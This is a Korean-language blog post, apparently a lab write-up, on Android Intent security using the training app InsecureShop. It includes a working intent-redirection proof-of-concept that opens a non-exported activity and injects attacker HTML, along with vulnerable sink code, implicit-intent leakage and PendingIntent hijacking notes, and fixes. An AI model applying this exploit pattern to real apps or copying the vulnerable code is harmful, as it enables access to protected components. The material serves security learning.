---
layout: post
title: "[Android 앱 보안 S07] Intent와 PendingIntent 보안"
date: 2026-09-02 15:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, Intent, IntentRedirection, PendingIntent, 암묵인텐트, IPC, InsecureShop, 학습기록]
excerpt: "남이 준 Intent를 그대로 실행해 주면 무슨 일이 벌어지는지 봤습니다. InsecureShop의 WebView2Activity는 extra_intent 라는 이름으로 넘어온 Intent를 검사 없이 startActivity 합니다. 직접 만든 공격 앱이 이 통로로 exported=false인 PrivateActivity를 열고, 그 안 WebView가 로드할 URL까지 통제해 화면에 'PWNED'를 띄웠습니다. 여기에 암묵 인텐트 유출과 PendingIntent의 mutable/immutable까지 함께 정리했습니다."
---

> S06에서 exported 컴포넌트로 데이터를 훔쳤습니다. 이번엔 그 반대 방향 — 신뢰받는 앱이 남의 Intent를 대신 실행하게 만들어, 닫혀 있어야 할 화면을 여는 intent redirection을 봅니다.

Intent는 앱 사이의 우편물입니다. 문제는 그 우편물 안에 또 다른 우편물이 들어 있을 때입니다. 신뢰받는 앱이 "안에 든 걸 대신 부쳐 줘"라는 요청을 그대로 따르면, 공격자는 자기 권한으로는 못 가던 곳에 그 앱의 이름으로 닿습니다. InsecureShop에 정확히 그 통로가 있어서, 공격 앱을 하나 만들어 끝까지 밀어 봤습니다.

---

## 실습 목표

- 남의 Intent를 검사 없이 실행하는 intent redirection을 실제로 재현한다.
- 그것으로 exported=false인 컴포넌트에 도달할 수 있는지 확인한다.
- 암묵 인텐트로 데이터를 내보내는 코드의 위험을 확인한다.
- PendingIntent의 mutable/immutable 차이를 정리한다.

---

## 윤리적 범위와 허가 조건

두 앱으로 재현했습니다. 피해 앱은 내가 소유한 InsecureShop, 공격(발신) 앱은 내가 직접 작성한 최소 앱(`com.aas.redirector`)입니다. 모두 `aas-api33` 에뮬레이터 안에서만 돌렸습니다.

---

## 환경 및 도구 버전

- 대상 기기: `aas-api33` (S01), 피해 앱: `com.insecureshop` (S02)
- 공격 앱 빌드: S05 손빌드 툴체인
- 정적 근거: S03 디컴파일 결과

---

## 위협 모델 — 신뢰의 대리 실행

- 신뢰받는 앱이 외부에서 받은 Intent를 그대로 실행하는가?
- 그 실행이 exported=false 컴포넌트에도 닿는가(권한 대리)?
- 넘겨받은 Intent의 extra까지 공격자가 통제하는가?

---

## 재현 절차

### 1. 취약한 싱크 (정적)

디컴파일한 `WebView2Activity`(exported)의 onCreate 첫머리입니다.

```java
Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
if (extraIntent != null) {
    startActivity(extraIntent);   // 남이 준 Intent 를 검사 없이 실행
    finish();
    return;
}
```

`extra_intent`라는 이름으로 넘어온 Intent를 아무 검사 없이 `startActivity` 합니다. 넘긴 쪽이 무엇을 담았든 InsecureShop이 대신 실행해 줍니다. 그리고 그 표적으로 삼기 좋은 게 `PrivateActivity`입니다.

```java
// PrivateActivity (exported=false) — 다른 앱이 직접은 못 열지만…
String data = getIntent().getStringExtra("url");
if (data == null) data = "https://www.insecureshopapp.com";
webview.loadUrl(data);   // url extra 를 그대로 WebView 에 로드
```

`PrivateActivity`는 매니페스트에서 `exported="false"`라 다른 앱이 직접 열 수 없습니다. 그런데 넘겨받은 `url` extra를 WebView에 그대로 로드합니다. 즉 여기까지 닿기만 하면 화면 내용까지 통제됩니다.

### 2. 공격 앱

발신 앱은 두 겹의 Intent를 만듭니다. 안쪽은 `PrivateActivity`를 겨냥하고 `url`을 공격자 HTML로 채운 Intent, 바깥쪽은 그 안쪽 Intent를 `extra_intent`에 담아 `WebView2Activity`로 보내는 Intent입니다.

```java
Intent inner = new Intent();
inner.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
inner.putExtra("url", "data:text/html,<html>…PWNED…</html>");   // 공격자 통제 URL

Intent outer = new Intent();
outer.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
outer.putExtra("extra_intent", inner);      // 신뢰받는 앱이 대신 실행하도록
startActivity(outer);
```

(패키지 가시성 때문에 발신 앱 매니페스트에 `<queries><package android:name="com.insecureshop"/></queries>`는 넣었습니다. S06에서 본 그 문턱입니다.)

### 3. 실행 결과

발신 앱을 실행하자 최상단 액티비티가 `PrivateActivity`로 바뀌었습니다. 발신 앱이 직접은 못 여는 그 비공개 화면입니다.

```console
$ adb shell dumpsys activity activities | grep topResumedActivity
topResumedActivity=ActivityRecord{... com.insecureshop/.PrivateActivity ...}
```

화면에는 공격자가 넣은 HTML이 그대로 떴습니다. exported=false 화면을 연 것에 더해, 그 WebView가 로드하는 내용까지 통제한 것입니다.

---

## 스크린샷

발신 앱 `com.aas.redirector`가 intent redirection으로 연 `PrivateActivity`입니다. 제목이 "Webview"(PrivateActivity의 타이틀)이고, WebView에는 공격자가 넣은 HTML이 렌더돼 있습니다.

![intent redirection으로 열린 PrivateActivity — 상단 제목 "Webview", 빨간 배경 WebView에 "PWNED / com.aas.redirector 가 intent redirection 으로 비공개(exported=false) PrivateActivity 를 열고 이 WebView 의 URL 까지 통제했다"가 표시됨](/assets/img/android-app-security/S07/01-redirect.png)

공격 앱 소스와 최상단 액티비티 확인 출력은 `assets/evidence/android-app-security/S07/`에 남겼습니다.

---

## 암묵 인텐트 유출 (한 걸음 더)

같은 앱의 `SendingDataViaActionActivity`는 반대 실수를 합니다. 데이터를 명시적 대상 없이 암묵 인텐트로 내보냅니다.

```java
Intent intent = new Intent("com.insecureshop.action.WEBVIEW");   // 컴포넌트 지정 없음
intent.putExtra("url", "https://www.insecureshop.com/");
startActivity(intent);
```

컴포넌트를 지정하지 않은 암묵 인텐트라, 이 액션(`com.insecureshop.action.WEBVIEW`, BROWSABLE)을 등록한 아무 앱이나 이 인텐트를 받아 그 안의 데이터를 가져갈 수 있습니다. 민감한 값을 이렇게 내보내면 그대로 유출 경로가 됩니다. 방향은 반대지만 뿌리는 같습니다 — Intent의 신뢰 경계를 확인하지 않은 것.

---

## PendingIntent — mutable와 immutable

PendingIntent는 "내 대신 이 인텐트를 나중에 실행해도 좋다"는 위임장입니다. 그래서 mutable이면 위험합니다. 받는 쪽이 빈 필드(컴포넌트·데이터)를 채워 넣어, 원래 발급자의 권한으로 엉뚱한 걸 실행할 수 있기 때문입니다(PendingIntent 하이재킹).

- Android 12(API 31)부터는 `PendingIntent` 생성 시 `FLAG_IMMUTABLE`이나 `FLAG_MUTABLE`을 반드시 명시해야 합니다. 기본으로 immutable을 쓰고, 정말 채워 넣을 필요가 있을 때만 mutable을 쓰는 게 원칙입니다.
- InsecureShop은 PendingIntent를 쓰지 않아 이 앱에서 재현할 대상은 없었습니다. 원칙만 정리해 둡니다 — 외부에 넘기는 PendingIntent는 `FLAG_IMMUTABLE`, 그리고 그 안의 기반 Intent는 명시적(컴포넌트 지정)이어야 합니다.

---

## 관측 결과

- `WebView2Activity`가 `extra_intent`를 검사 없이 `startActivity` 한다. 발신 앱이 exported=false인 `PrivateActivity`를 이 통로로 열었다.
- 열린 `PrivateActivity`의 WebView URL까지 공격자가 통제했다(화면에 공격자 HTML 렌더).
- `SendingDataViaActionActivity`는 데이터를 암묵 인텐트로 내보내, 액션만 등록하면 가로챌 수 있다.
- PendingIntent는 이 앱엔 없지만, mutable이면 하이재킹 위험이 있다.

---

## 근본 원인과 보안 영향

- 외부에서 받은 Intent를 신뢰하고 그대로 실행한 게 intent redirection의 뿌리입니다. 신뢰받는 앱이 공격자의 손발이 되어, 자신의 접근 권한으로 닫힌 컴포넌트를 엽니다.
- 암묵 인텐트로 데이터를 내보내면 수신자를 특정할 수 없어 유출·가로채기가 열립니다.
- PendingIntent를 mutable로 두면 위임장을 받은 쪽이 내용을 바꿔 발급자 권한으로 실행할 수 있습니다.

## 수정 방법

- 넘겨받은 Intent를 그대로 실행하지 않는다. 꼭 필요하면 대상 컴포넌트·액션·데이터를 화이트리스트로 검증하고, 자기 앱 내부 컴포넌트인지 확인한다.
- 민감 데이터는 명시적 인텐트(컴포넌트 지정)로만 보낸다. 암묵 인텐트에는 민감 값을 싣지 않는다.
- 외부로 나가는 PendingIntent는 `FLAG_IMMUTABLE`로 만들고, 기반 Intent도 명시적으로 둔다.

수정 전후는 결국 이 차이입니다.

```java
// 전: 남이 준 Intent 를 그대로
startActivity(getIntent().getParcelableExtra("extra_intent"));
// 후: 대상이 내 앱 내부인지 확인하고, 아니면 거부
Intent inner = getIntent().getParcelableExtra("extra_intent");
if (inner != null && getPackageName().equals(inner.resolveActivity(getPackageManager()) == null ? null : inner.resolveActivity(getPackageManager()).getPackageName())) {
    startActivity(inner);
}
```

---

## 재검증

발신 앱 실행 후 최상단 액티비티가 `com.insecureshop/.PrivateActivity`로 바뀐 것(닫힌 화면에 도달), 그리고 그 WebView에 공격자 HTML이 렌더된 것(URL 통제) 두 가지로 redirection을 확인했습니다. 발신 앱 자체는 `PrivateActivity`를 직접 열 권한이 없습니다 — 그 화면이 열렸다는 사실 자체가 대리 실행의 증거입니다.

---

## 참고 자료

- Android Developers — Intent redirection 취약점과 방어
- Android Developers — 암묵 인텐트와 명시적 인텐트
- Android Developers — PendingIntent, `FLAG_IMMUTABLE`(API 31+)
